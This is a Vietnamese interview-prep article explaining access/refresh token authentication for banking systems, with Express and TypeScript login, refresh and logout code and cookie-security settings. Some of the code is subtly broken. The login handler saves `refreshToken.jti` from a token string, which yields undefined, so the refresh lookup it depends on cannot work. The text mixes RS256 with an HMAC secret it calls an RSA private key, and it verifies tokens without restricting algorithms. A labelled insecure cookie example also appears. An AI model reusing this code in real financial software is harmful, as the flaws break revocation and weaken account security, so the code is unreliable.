# 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security

## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Secure auth flow: Access Token (short-lived, 15min, memory) + Refresh Token (long-lived, 7-30 days, httpOnly cookie). Implement token rotation, XSS/CSRF protection, MFA cho high-security systems."**

**🔑 Architecture - Dual Token Pattern:**

**1. Access Token (JWT):**
- **Thời hạn**: 15 phút (ngắn - limit damage nếu stolen)
- **Lưu ở**: Memory (JS variable) - KHÔNG localStorage (XSS vulnerable)
- **Dùng để**: API calls - `Authorization: Bearer <token>`
- **Mất khi**: Refresh page → lấy lại từ refresh token

**2. Refresh Token:**
- **Thời hạn**: 7-30 ngày (dài - UX tốt)
- **Lưu ở**: **httpOnly Cookie** - JS không đọc được (chống XSS)
- **Flags**: `Secure` (HTTPS only), `SameSite=Strict` (chống CSRF)
- **Dùng để**: Lấy access token mới khi expired

**3. Authentication Flow:**
```
Login → Server return:
  - Access Token (response body)
  - Refresh Token (httpOnly cookie)
→ Client lưu access token in memory
→ API calls với access token
→ Token expired (15min) → call /refresh endpoint
→ Server verify refresh token (cookie) → return new access token
```

**4. Security Measures:**
- **Token Rotation**: Refresh token thay đổi mỗi lần dùng (detect stolen tokens)
- **Token Blacklist**: Revoke tokens khi logout/suspicious activity
- **MFA**: 2FA/OTP cho sensitive operations (transfer, withdraw)
- **Device fingerprinting**: Detect unusual login locations
- **Rate limiting**: Max 5 failed attempts → lock account 30min

**⚠️ Lỗi Thường Gặp:**
- Lưu tokens trong localStorage → **XSS steal tokens**
- Không rotate refresh tokens → stolen token dùng mãi
- CORS misconfiguration → expose tokens cross-origin
- Không implement CSRF tokens → cross-site request attacks

**💡 Kiến Thức Senior:**
- **JWT structure**: Header.Payload.Signature (Base64URL encoded)
- **Signature algorithms**: HS256 (symmetric, shared secret) vs **RS256** (asymmetric, safer - banking)
- **Silent refresh**: Background refresh trước khi expired (smooth UX)
- **Token introspection**: Server-side validation cho high-security (không tin client JWT)
- **OAuth 2.0 + PKCE**: Authorization Code Flow với Proof Key (mobile apps)

**Trả lời:**

Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo mật cực kỳ cao** vì liên quan đến tiền bạc và thông tin nhạy cảm. Flow chuẩn sử dụng **JWT (JSON Web Token)** với **Access Token + Refresh Token** kết hợp **httpOnly Cookie**.

#### **📊 Tổng Quan Authentication Flow**

```
┌────────────────────────────────────────────────────────────────────┐
│              SECURE AUTHENTICATION FLOW                            │
│        (Banking/Trading System - Hệ Thống Ngân Hàng)              │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  🔑 ACCESS TOKEN                                                   │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 15 phút (ngắn)                                   │ │
│  │ • Lưu ở: Memory (JavaScript variable)                       │ │
│  │ • Dùng để: Gọi API (Authorization: Bearer <token>)          │ │
│  │ • Mất khi: Refresh page (phải lấy lại)                      │ │
│  │ • Bảo mật: Không lưu localStorage (XSS risk)                │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🔄 REFRESH TOKEN                                                  │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 7-30 ngày (dài)                                  │ │
│  │ • Lưu ở: httpOnly Cookie (server-side chỉ đọc được)         │ │
│  │ • Dùng để: Lấy Access Token mới khi hết hạn                 │ │
│  │ • Bảo mật: httpOnly + Secure + SameSite=Strict              │ │
│  │ • Không đọc được bởi JavaScript (chống XSS)                 │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🍪 SESSION COOKIE (Optional - cho Banking)                       │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: Session (đóng browser = mất)                    │ │
│  │ • Lưu ở: httpOnly Cookie                                    │ │
│  │ • Dùng để: Session ID (server tracking)                     │ │
│  │ • Bảo mật: httpOnly + Secure                                │ │
│  └──────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────┘
```

---

#### **🔐 1. Access Token vs Refresh Token - Phân Biệt Chi Tiết**

**Access Token (Token Truy Cập):**

```typescript
// 🔑 Cấu trúc JWT Access Token (3 phần: Header.Payload.Signature)
{
  "header": {  // 📋 Phần 1: Metadata về token
    "alg": "RS256",      // 🔐 Thuật toán mã hóa (RSA + SHA256 - asymmetric, an toàn cho banking)
    "typ": "JWT"         // 📝 Loại token (JSON Web Token)
  },
  "payload": {  // 📦 Phần 2: Dữ liệu user (claims - không mã hóa, chỉ Base64 encode)
    "sub": "user123",    // 👤 User ID - Subject (identifier duy nhất)
    "name": "John Doe",  // 📛 Tên user (hiển thị UI)
    "email": "john@example.com",  // 📧 Email
    "role": "trader",    // 🎭 Role: admin, trader, customer (phân quyền)
    "permissions": ["trade", "view_balance", "transfer"],  // 🔑 Quyền cụ thể
    "iat": 1699999999,   // ⏰ Issued At (thời điểm tạo - Unix timestamp)
    "exp": 1700000899    // ⌛ Expiry (hết hạn sau 15 phút - Unix timestamp)
  },
  "signature": "..."     // ✍️ Phần 3: Chữ ký số (verify token không bị giả mạo/sửa đổi)
  // Signature = HMAC-SHA256(base64(header) + "." + base64(payload), secret)
}

// 📌 Đặc điểm Access Token:
// ✅ ⏱️ Thời hạn ngắn: 5-15 phút (giảm thiệt hại nếu bị đánh cắp)
// ✅ 💾 Lưu trong memory (JavaScript variable - biến toàn cục hoặc state)
// ✅ 📡 Gửi kèm mọi API request: Authorization: Bearer <token>
// ✅ 📦 Chứa thông tin user (role, permissions - client không cần query lại)
// ✅ 🔓 Payload KHÔNG mã hóa (chỉ Base64 - ai cũng đọc được)
// ❌ 🚫 KHÔNG lưu localStorage/sessionStorage (XSS có thể đánh cắp)
// ❌ 🚫 KHÔNG chứa sensitive data (password, credit card, SSN)
```

**Refresh Token (Token Làm Mới):**

```typescript
// 🔄 Cấu trúc Refresh Token (thường là random string hoặc JWT đơn giản)
{
  "jti": "unique-token-id-abc123xyz",  // 🆔 Token ID duy nhất (JWT ID - để track/revoke)
  "sub": "user123",                    // 👤 User ID (Subject)
  "iat": 1699999999,                   // ⏰ Issued At (thời điểm tạo)
  "exp": 1702591999                    // ⌛ Expiry (hết hạn sau 30 ngày - 2592000 giây)
}

// 📌 Đặc điểm Refresh Token:
// ✅ ⏱️ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn - UX tốt, không phải login liên tục)
// ✅ 🍪 Lưu trong httpOnly Cookie (JS KHÔNG đọc được bằng document.cookie)
// ✅ 🔄 Chỉ dùng để lấy Access Token mới (single purpose)
// ✅ 🗄️ Lưu trong database (để có thể revoke/blacklist khi cần)
// ✅ 🔒 Có thể revoke (thu hồi) từ server (logout, suspicious activity)
// ❌ 🚫 KHÔNG gửi kèm API thường (chỉ gửi tới /auth/refresh endpoint)
// ❌ 🚫 KHÔNG chứa nhiều thông tin (chỉ jti, sub, exp - minimal payload)
```

**Tại Sao Cần 2 Token?**

```
┌────────────────────────────────────────────────────────────┐
│                    TẠI SAO CẦN 2 TOKEN?                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Scenario 1: Chỉ dùng 1 Access Token dài hạn              │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ❌ Nếu token bị leak (XSS, network sniffing)         │ │
│  │    → Hacker có 30 ngày để dùng token                 │ │
│  │    → Không thể thu hồi (revoke)                      │ │
│  │    → RỦI RO CỰC CAO!                                 │ │
│  └──────────────────────────────────────────────────────┘ │
│                                                            │
│  Scenario 2: Dùng Access Token (15 phút) + Refresh Token  │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ✅ Access Token bị leak                              │ │
│  │    → Chỉ dùng được 15 phút                           │ │
│  │    → Tự động hết hạn                                 │ │
│  │                                                       │ │
│  │ ✅ Refresh Token bị leak                             │ │
│  │    → Lưu httpOnly cookie (khó bị XSS)               │ │
│  │    → Server có thể revoke (blacklist)               │ │
│  │    → Có thể detect suspicious activity               │ │
│  │                                                       │ │
│  │ → RỦI RO THẤP HƠN NHIỀU!                             │ │
│  └──────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

---

#### **🔄 2. Authentication Flow Chi Tiết (Step-by-Step)**

**A. Login Flow (Đăng Nhập):**

```typescript
// ============================================
// BƯỚC 1: User Login
// ============================================

// 🌐 Frontend: Gửi username + password đến server
async function login(username: string, password: string) {
  try {
    const response = await fetch('https://api.bank.com/auth/login', {
      method: 'POST',  // 📮 HTTP POST method
      headers: {
        'Content-Type': 'application/json',  // 📝 Gửi JSON data
      },
      body: JSON.stringify({  // 📦 Payload gửi lên server
        username,  // 👤 Username hoặc email
        password,  // 🔑 Password (sẽ hash bằng bcrypt ở server)
        // Optional: MFA code, device fingerprint
        mfaCode: '123456',  // 🔢 MFA/2FA code (Google Authenticator, SMS OTP)
        deviceId: getDeviceFingerprint(),  // 🖥️ Device fingerprint (detect thiết bị lạ)
      }),
      credentials: 'include', // ⚠️ QUAN TRỌNG: Cho phép gửi/nhận cookie (refresh token)
      // credentials: 'include' → browser tự động gửi cookies với request
      // và lưu Set-Cookie response vào browser
    });

    if (!response.ok) {  // ❌ Nếu login thất bại (4xx, 5xx status)
      throw new Error('Login failed');
    }

    const data = await response.json();  // 📦 Parse JSON response
    
    // 📝 Response structure từ server:
    // {
    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",  // 🔑 Access Token (JWT string)
    //   user: { id: "123", name: "John", role: "trader" },  // 👤 User info (hiển thị UI)
    //   expiresIn: 900  // ⏰ 15 phút (900 giây - để tính refresh time)
    // }
    
    // 🍪 Refresh Token được server tự động set vào httpOnly cookie:
    // Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
    // → Browser tự động lưu cookie này (JS không thấy được)
    
    return data;  // ✅ Trả về accessToken + user info
  } catch (error) {
    console.error('Login error:', error);  // 🚨 Log lỗi ra console
    throw error;  // ⚠️ Throw lại để component xử lý (hiển thị lỗi cho user)
  }
}

// ============================================
// BƯỚC 2: Server Xử Lý Login
// ============================================

// 🔧 Backend (Node.js/Express) - Xử lý login request
app.post('/auth/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;  // 📦 Lấy data từ request body
  
  // 🔹 BƯớc 1: Verify username + password (bcrypt hash comparison)
  const user = await db.findUserByUsername(username);  // 🔍 Tìm user trong database
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // bcrypt.compare() so sánh password plaintext với hash trong DB
    // → An toàn, không lưu password gốc
    return res.status(401).json({ error: 'Invalid credentials' });  // ❌ 401 Unauthorized
  }
  
  // 🔹 BƯớc 2: Verify MFA (Multi-Factor Authentication - xác thực 2 lớp)
  if (!verifyMFA(user, mfaCode)) {  // ✅ Kiểm tra OTP/2FA code
    // verifyMFA() kiểm tra TOTP (Google Authenticator) hoặc SMS OTP
    return res.status(401).json({ error: 'Invalid MFA code' });  // ❌ MFA sai
  }
  
  // 🔹 BƯớc 3: Check account status (không bị khóa, không bị tạm ngưng)
  if (user.isLocked || user.isSuspended) {
    // isLocked: Quá nhiều lần login sai (brute force protection)
    // isSuspended: Admin tạm ngưng account (vi phạm, fraud detection)
    return res.status(403).json({ error: 'Account locked' });  // ❌ 403 Forbidden
  }
  
  // 🔹 BƯớc 4: Generate Access Token (JWT - 15 phút)
  const accessToken = jwt.sign(  // 🔐 jwt.sign() tạo JWT token
    {  // 📦 Payload (claims) - thông tin user (Base64 encoded, KHÔNG mã hóa)
      sub: user.id,  // 🆔 Subject - User ID duy nhất
      name: user.name,  // 📛 Tên hiển thị
      email: user.email,  // 📧 Email
      role: user.role,  // 🎭 Role: admin/trader/customer (phân quyền)
      permissions: user.permissions,  // 🔑 Quyền cụ thể (RBAC - Role-Based Access Control)
    },
    process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key (RSA) - biến môi trường, KHÔNG commit lên Git
    { expiresIn: '15m' }  // ⌛ 15 phút (ngắn - giảm thiệt hại nếu leak)
  );
  
  // 🔹 BƯớc 5: Generate Refresh Token (JWT - 30 ngày)
  const refreshToken = jwt.sign(
    {  // 📦 Payload tối thiểu (chỉ cần jti và sub)
      jti: uuidv4(),  // 🆔 JWT ID - unique identifier để track/revoke token
      sub: user.id,  // 👤 User ID
    },
    process.env.REFRESH_TOKEN_SECRET,  // 🔑 Khóa riêng cho refresh token (KHÁC với access token)
    { expiresIn: '30d' }  // ⌛ 30 ngày (dài - UX tốt, user không phải login liên tục)
  );
  
  // 🔹 BƯớc 6: Lưu Refresh Token vào database (để có thể revoke sau)
  await db.saveRefreshToken({
    tokenId: refreshToken.jti,  // 🆔 JWT ID (unique)
    userId: user.id,  // 👤 User ID (foreign key)
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),  // ⌛ Expiry date
    deviceInfo: req.headers['user-agent'],  // 🖥️ Thông tin thiết bị (browser, OS)
    ipAddress: req.ip,  // 🌐 IP address (geo-location, fraud detection)
  });
  // → Lưu vào DB để: revoke khi logout, detect multiple logins, audit trail
  
  // 🔹 BƯớc 7: Set Refresh Token vào httpOnly Cookie (🛡️ Bảo mật cao nhất)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // ⚠️ QUAN TRỌNG: JavaScript KHÔNG đọc được (chống XSS)
    // document.cookie sẽ KHÔNG thấy cookie này
    // Chỉ browser gửi tự động với requests
    
    secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
    // Production MUST có, dev localhost có thể tắt
    
    sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
    // 'strict': KHÔNG gửi cookie khi navigate từ site khác
    // 'lax': Gửi cookie khi GET navigation (moderate security)
    // 'none': Gửi mọi cross-site (least secure, cần secure: true)
    
    maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
    // Browser tự động xóa cookie sau 30 ngày
    
    path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
    // Giảm exposure - không gửi tới mọi API endpoint
    // Chỉ có POST /auth/refresh mới nhận được cookie này
  });
  // → Browser tự động lưu cookie và gửi kèm requests tới /auth/refresh
  
  // 🔹 BƯớc 8: Log login event (audit trail - vết vết hoạt động)
  await logEvent({
    type: 'LOGIN_SUCCESS',  // 📝 Loại event (LOGIN_SUCCESS, LOGIN_FAILED, LOGOUT, etc.)
    userId: user.id,  // 👤 User ID
    ipAddress: req.ip,  // 🌐 IP address (để detect unusual locations)
    deviceInfo: req.headers['user-agent'],  // 🖥️ Device info (browser, OS)
    timestamp: new Date(),  // ⏰ Thời gian
  });
  // → Audit trail giúp: compliance (kế toán), security (detect breach), debugging
  
  // 🔹 BƯớc 9: Return Access Token về client (qua response body JSON)
  res.json({
    accessToken,  // 🔑 JWT string - client lưu trong memory
    user: {  // 👤 User info (hiển thị UI - không sensitive)
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
    },
    expiresIn: 900,  // ⏰ 15 phút = 900 giây (client dùng để tính thời điểm refresh)
  });
  // ✅ Success response: 200 OK + JSON body
  // 🍪 Refresh token đã set vào cookie ở bƯớc 7
});

// ============================================
// BƯỚC 3: Frontend Lưu Access Token
// ============================================

// 💾 Store Access Token in memory (JavaScript variable - biến toàn cục)
// ⚠️ KHÔNG dùng localStorage/sessionStorage (XSS có thể đọc được)
let accessToken: string | null = null;  // 🔑 Lưu trong RAM, mất khi refresh page

async function handleLogin(username: string, password: string) {
  const response = await login(username, password);  // 📡 Gọi API login
  
  // 🔹 Lưu Access Token trong memory (biến toàn cục)
  accessToken = response.accessToken;  // 🔑 JWT string
  // → Mất khi user refresh page (an toàn hơn localStorage)
  // → Phải lấy lại từ refresh token khi refresh page
  
  // 🔹 Lưu user info (KHÔNG sensitive) vào localStorage
  localStorage.setItem('user', JSON.stringify(response.user));
  // → Hiển thị tên user khi refresh page (trước khi lấy token mới)
  // → OK vì không chứa sensitive data (không có password, token)
  
  // 🔹 Redirect to dashboard
  window.location.href = '/dashboard';  // 🎯 Chuyển sang trang chính
}

// ❌ ⚠️ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
// localStorage.setItem('accessToken', token);  // ❌ XSS có thể đọc: document.cookie, localStorage
// sessionStorage.setItem('accessToken', token); // ❌ Vẫn XSS risk (JS đọc được)
```

---

**B. API Call Flow (Gọi API với Access Token):**

```typescript
// ============================================
// 🌐 Frontend: Gọi API với Access Token
// ============================================

// 🛠️ Helper function: Tự động attach Access Token vào mọi API request
async function apiCall(url: string, options: RequestInit = {}) {
  // ✅ Kiểm tra nếu Access Token hết hạn → refresh trước
  if (isTokenExpired(accessToken)) {  // ⏰ Check expiry time (JWT exp claim)
    await refreshAccessToken();  // 🔄 Lấy token mới từ refresh token
  }
  
  // 📡 Gửi request với Access Token trong header
  const response = await fetch(url, {
    ...options,  // 📦 Spread các options hiện có (method, body, etc.)
    headers: {
      ...options.headers,  // 📋 Giữ lại headers hiện có
      'Authorization': `Bearer ${accessToken}`,  // 🔑 Thêm Authorization header
      // "Bearer" là chuẩn OAuth 2.0 cho JWT tokens
    },
    credentials: 'include',  // 🍪 Gửi cookies (refresh token - nếu cần)
  });
  
  // ⚠️ Nếu 401 Unauthorized → token invalid (expired/revoked), logout
  if (response.status === 401) {
    await logout();  // 🚪 Xóa tokens, clear state
    window.location.href = '/login';  // 🔄 Redirect về login page
    throw new Error('Unauthorized');  // ❌ Throw error để stop execution
  }
  
  return response.json();  // 📦 Parse JSON response
}

// 📝 Usage: Gọi API lấy số dư tài khoản
const balance = await apiCall('https://api.bank.com/account/balance');
console.log(balance); // { balance: 1000000, currency: 'VND' }

// ============================================
// 🔧 Backend: Verify Access Token (Middleware)
// ============================================

// 🛡️ Middleware: Verify JWT token trước khi vào protected routes
function authenticateToken(req, res, next) {
  // 🔹 Bước 1: Lấy token từ Authorization header
  const authHeader = req.headers['authorization'];  // "Bearer eyJhbG..."
  const token = authHeader && authHeader.split(' ')[1];  // 🔪 Tách "Bearer" + token
  // authHeader.split(' ') → ["Bearer", "eyJhbG..."]
  // [1] → lấy phần token (index 1)
  
  if (!token) {  // ❌ Nếu không có token
    return res.status(401).json({ error: 'No token provided' });  // 401 Unauthorized
  }
  
  // 🔹 Bước 2: Verify token với secret key
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    // jwt.verify() kiểm tra:
    // - Signature hợp lệ (không bị sửa đổi)
    // - Chưa hết hạn (exp claim)
    // - Issuer đúng (nếu có iss claim)
    
    if (err) {  // ❌ Token expired hoặc invalid
      // err.name === 'TokenExpiredError' → hết hạn
      // err.name === 'JsonWebTokenError' → sai signature/format
      return res.status(403).json({ error: 'Invalid token' });  // 403 Forbidden
    }
    
    // ✅ Token hợp lệ
    // 🔹 Bước 3: Attach user info vào request object
    req.user = user;  // 👤 { sub: "123", role: "trader", permissions: [...] }
    // → Downstream routes có thể dùng req.user để phân quyền
    next();  // ➡️ Tiếp tục vào route handler
  });
}

// 🛡️ Protected route - Yêu cầu authentication
app.get('/account/balance', authenticateToken, async (req, res) => {
  // authenticateToken middleware chạy trước → đảm bảo req.user tồn tại
  const userId = req.user.sub;  // 🆔 Lấy User ID từ JWT payload
  const balance = await db.getBalance(userId);  // 💰 Query database
  res.json(balance);  // 📤 Return JSON response
});
```

---

**C. Refresh Token Flow (Làm Mới Access Token):**

```typescript
// ============================================
// 🔄 Frontend: Refresh Access Token (Lấy token mới khi hết hạn)
// ============================================

async function refreshAccessToken(): Promise<void> {
  try {
    const response = await fetch('https://api.bank.com/auth/refresh', {
      method: 'POST',  // 📮 HTTP POST
      credentials: 'include',  // 🍪 QUAN TRỌNG: Gửi httpOnly cookie (refreshToken)
      // Browser tự động gửi cookie "refreshToken" kèm request
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    if (!response.ok) {  // ❌ Nếu refresh thất bại (401, 403)
      // Refresh token hết hạn hoặc invalid → logout
      throw new Error('Refresh token expired');
    }
    
    const data = await response.json();  // 📦 Parse response
    // 📝 Response structure:
    // {
    //   accessToken: "new-token...",  // 🔑 Access Token mới (JWT string)
    //   expiresIn: 900  // ⏰ 15 phút
    // }
    
    // ✅ Cập nhật Access Token mới vào memory
    accessToken = data.accessToken;  // 🔄 Ghi đè token cũ
    
    console.log('Access token refreshed');  // 📝 Log success
  } catch (error) {
    console.error('Refresh failed:', error);  // 🚨 Log lỗi
    
    // 🚪 Logout user (refresh token không còn hợp lệ)
    await logout();  // Xóa tokens, clear state
    window.location.href = '/login';  // 🔄 Redirect về login
  }
}

// ⏰ Auto-refresh token trước khi hết hạn (silent refresh)
function startTokenRefreshTimer() {
  // 🕒 Refresh token trước 1 phút khi hết hạn (14 phút)
  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút = 840000ms
  // → Refresh ở phút 14, trước khi hết hạn ở phút 15
  
  setInterval(async () => {  // 🔄 Lặp lại mỗi 14 phút
    await refreshAccessToken();  // Gọi API refresh
  }, refreshTime);
}

// 🚀 Gọi khi app khởi động (App.tsx, main.tsx)
startTokenRefreshTimer();  // Bắt đầu timer

// ============================================
// 🔧 Backend: Refresh Token Endpoint
// ============================================

app.post('/auth/refresh', async (req, res) => {
  // 🔹 BƯớc 1: Lấy Refresh Token từ httpOnly cookie
  const refreshToken = req.cookies.refreshToken;  // 🍪 Browser tự động gửi cookie
  
  if (!refreshToken) {  // ❌ Nếu không có cookie (user chưa login)
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // 🔹 BƯớc 2: Verify Refresh Token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    // → Kiểm tra signature, expiry, format
    // → decoded = { jti: "...", sub: "user123", iat: ..., exp: ... }
    
    // 🔹 BƯớc 3: Check token trong database (chưa bị revoke?)
    const tokenRecord = await db.findRefreshToken(decoded.jti);  // 🔍 Tìm theo JWT ID
    if (!tokenRecord || tokenRecord.isRevoked) {  // ❌ Token bị revoke (blacklist)
      // isRevoked = true khi: logout, suspicious activity, password change
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // 🔹 BƯớc 4: Check user vẫn còn active
    const user = await db.findUserById(decoded.sub);  // 🔍 Tìm user
    if (!user || user.isLocked) {  // ❌ User không tồn tại hoặc bị khóa
      return res.status(403).json({ error: 'User inactive' });
    }
    
    // 🔹 BƯớc 5: Generate Access Token mới (15 phút)
    const newAccessToken = jwt.sign(
      {  // 📦 Payload (fresh data từ database)
        sub: user.id,
        name: user.name,  // Có thể đã thay đổi từ lần login
        email: user.email,
        role: user.role,  // Có thể admin đã thay đổi quyền
        permissions: user.permissions,
      },
      process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key
      { expiresIn: '15m' }  // ⌛ 15 phút
    );
    
    // 🔹 BƯớc 6: Log refresh event (audit trail)
    await logEvent({
      type: 'TOKEN_REFRESH',  // 📝 Event type
      userId: user.id,  // 👤 User ID
      tokenId: decoded.jti,  // 🆔 Token ID
      timestamp: new Date(),  // ⏰ Thời gian
    });
    
    // 🔹 BƯớc 7: Return Access Token mới
    res.json({
      accessToken: newAccessToken,  // 🔑 JWT string
      expiresIn: 900,  // ⏰ 15 phút
    });
    // ✅ Refresh token vẫn giữ nguyên trong cookie (không thay đổi)
    // ⚠️ Nếu muốn Token Rotation: generate refresh token mới ở đây
    
  } catch (error) {
    // ❌ Token expired hoặc invalid signature
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

---

**D. Logout Flow (Đăng Xuất):**

```typescript
// ============================================
// 🚪 Frontend: Logout (Xóa tokens, clear state)
// ============================================

async function logout(): Promise<void> {
  try {
    // 🔹 BƯớc 1: Gọi API logout (revoke refresh token trên server)
    await fetch('https://api.bank.com/auth/logout', {
      method: 'POST',  // 📮 HTTP POST
      credentials: 'include',  // 🍪 Gửi refreshToken cookie
    });
    // → Server sẽ revoke token trong database (blacklist)
    
    // 🔹 BƯớc 2: Xóa Access Token khỏi memory
    accessToken = null;  // 🗄️ Set null (garbage collected)
    
    // 🔹 BƯớc 3: Xóa user info khỏi localStorage
    localStorage.removeItem('user');  // 🗄️ Xóa user data
    
    // 🔹 BƯớc 4: Clear any cached data
    sessionStorage.clear();  // 🧹 Xóa tất cả session data
    // → Xóa cached API responses, temporary data
    
    // 🔹 BƯớc 5: Redirect to login
    window.location.href = '/login';  // 🔄 Chuyển về trang login
    
  } catch (error) {
    console.error('Logout error:', error);  // 🚨 Log lỗi
    // ⚠️ Vẫn redirect về login dù có lỗi (fail-safe)
    window.location.href = '/login';
  }
}

// ============================================
// 🔧 Backend: Logout Endpoint (Revoke tokens)
// ============================================

app.post('/auth/logout', async (req, res) => {
  // 🔹 BƯớc 1: Lấy Refresh Token từ cookie
  const refreshToken = req.cookies.refreshToken;  // 🍪 httpOnly cookie
  
  if (refreshToken) {  // ✅ Nếu có cookie (user đang login)
    try {
      // 🔹 BƯớc 2: Decode token để lấy JWT ID
      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
      // → decoded = { jti: "...", sub: "user123", ... }
      
      // 🔹 BƯớc 3: Revoke token trong database (blacklist)
      await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
      // → Token không thể dùng để refresh nữa
      // → Nếu hacker đánh cắp cookie, không dùng được
      
      // 🔹 BƯớc 4: Log logout event (audit trail)
      await logEvent({
        type: 'LOGOUT',  // 📝 Event type
        userId: decoded.sub,  // 👤 User ID
        tokenId: decoded.jti,  // 🆔 Token ID
        timestamp: new Date(),  // ⏰ Thời gian
      });
      // → Tracking user activities, compliance
      
    } catch (error) {
      console.error('Logout error:', error);  // 🚨 Log lỗi (token invalid/expired - OK)
    }
  }
  
  // 🔹 BƯớc 5: Xóa Refresh Token cookie khỏi browser
  res.clearCookie('refreshToken', {  // 🗄️ Xóa cookie
    httpOnly: true,  // ⚠️ Phải trùng với lúc set cookie
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',  // ⚠️ Path phải trùng khớp
  });
  // → Browser xóa cookie ngay lập tức
  
  // 🔹 BƯớc 6: Return success
  res.json({ message: 'Logged out successfully' });  // ✅ 200 OK
});
```

---

#### **🛡️ 3. Security Best Practices (Thực Hành Bảo Mật)**

**A. Cookie Security:**

```typescript
// ============================================
// 🔒 SECURE COOKIE CONFIGURATION (Cấu hình cookie an toàn)
// ============================================

// ✅ ĐÚNG: Secure httpOnly Cookie (Banking/Trading MUST có)
res.cookie('refreshToken', token, {
  httpOnly: true,    // ⚠️ JavaScript KHÔNG đọc được (chống XSS)
  // document.cookie = undefined (JS không thấy cookie này)
  // Chỉ server đọc được qua req.cookies
  
  secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
  // Production MUST có, dev localhost có thể tắt
  
  sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
  // 'strict': KHÔNG gửi cookie khi navigate từ site khác
  // VD: evil.com → bank.com (cookie KHÔNG gửi)
  
  maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
  // Browser tự động xóa cookie sau 30 ngày
  
  path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
  // Giảm exposure - không gửi tới mọi API endpoint
  // Chỉ POST /auth/refresh mới nhận được cookie
  
  domain: '.bank.com',  // 🌐 Cho phép subdomain (api.bank.com, www.bank.com)
  // Nếu không set = chỉ exact domain
});

// ❌ SAI: Không secure (⚠️ NEVER dùng trong production)
res.cookie('refreshToken', token, {
  httpOnly: false,   // ❌ JS đọc được → XSS có thể đánh cắp
  secure: false,     // ❌ Gửi qua HTTP → MITM (Man-In-The-Middle) attack
  sameSite: 'none',  // ❌ Gửi cross-site → CSRF attack risk
});

// ============================================
// Cookie Attributes Giải Thích
// ============================================

/**
 * httpOnly: true
 * - JavaScript không đọc được: document.cookie = undefined
 * - Chỉ server đọc được
 * - Chống XSS: Hacker inject script cũng không lấy được cookie
 * 
 * secure: true
 * - Chỉ gửi qua HTTPS (không qua HTTP)
 * - Chống MITM (Man-In-The-Middle) attack
 * - Production MUST có
 * 
 * sameSite: 'strict'
 * - Không gửi cookie khi navigate từ site khác
 * - Example: evil.com → bank.com (cookie KHÔNG gửi)
 * - Chống CSRF attack
 * - Options: 'strict' | 'lax' | 'none'
 *   - strict: Không gửi cross-site (most secure)
 *   - lax: Gửi khi GET navigation (moderate)
 *   - none: Gửi mọi cross-site (least secure)
 * 
 * path: '/auth/refresh'
 * - Cookie chỉ gửi tới endpoint này
 * - Giảm exposure (không gửi tới mọi endpoint)
 * 
 * domain: '.bank.com'
 * - Cho phép subdomain: api.bank.com, www.bank.com
 * - Không set = chỉ exact domain
 */
```

**B. Token Storage (Lưu Trữ Tokens):**

```typescript
// ============================================
// 💾 WHERE TO STORE TOKENS? (Lưu tokens ở đâu?)
// ============================================

// ✅ Access Token: MEMORY (JavaScript variable - biến toàn cục)
let accessToken: string | null = null;  // 💾 Lưu trong RAM

// 📝 Lý do dùng memory:
// - ⚡ Mất khi refresh page (an toàn hơn - attacker không lấy được nếu inject XSS sau)
// - 🛡️ Không bị XSS nếu page refresh (token biến mất)
// - ⏱️ Short-lived (15 phút) nên OK (hạn chế thiệt hại)
// - 🔄 Phải lấy lại từ refresh token khi reload (trade-off UX vs security)

// ✅ Refresh Token: httpOnly Cookie (🍪 Server-side cookie)
// Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// 📝 Lý do dùng httpOnly cookie:
// - 🔒 JavaScript KHÔNG đọc được (chống XSS - document.cookie = undefined)
